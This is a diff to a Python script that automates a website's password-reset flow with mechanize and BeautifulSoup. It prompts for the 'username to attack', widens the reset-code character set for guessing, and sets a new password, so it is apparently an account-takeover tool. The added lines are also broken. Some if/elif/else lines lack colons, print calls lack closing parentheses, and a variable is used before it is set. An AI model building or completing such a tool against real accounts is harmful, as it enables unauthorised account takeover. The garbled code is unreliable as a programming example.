@@ -5,7 +5,7 @@ from bs4 import BeautifulSoup
 
 import mechanize
 
-CHRS = '0123456789'
+CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
@@ -28,18 +28,24 @@ browser.select_form(nr=0)
 browser.submit()
 browser.select_form(nr=0)
 browser.submit()
-forms = list(browser.forms())
-form = forms[0]
-print(form)
-y = input('Continue? 1,2, else:')
-"""reset code input"""
-reset = input('Code: ')
+if soup.find(string="6 characters long") != None
+  print(soup.find(string="6 characters long")
+elif soup.find(string="8 characters long") != None
+  print(soup.find(string="8 characters long")
+else
+  y == 0
+
 browser.form['n'] = reset
 browser.submit()
+
 """new password"""
 new = input('New Password: ')
 browser.select_form(nr=0)
 browser.select_form(nr=0)
 browser.form['password_new'] = new
 browser.form.set_value(reset, nr=2)
+y = input('Continue? 1,2, else:')
+"""reset code input"""
+reset = input('Code: ')
 soup.find(string='password_new')
+
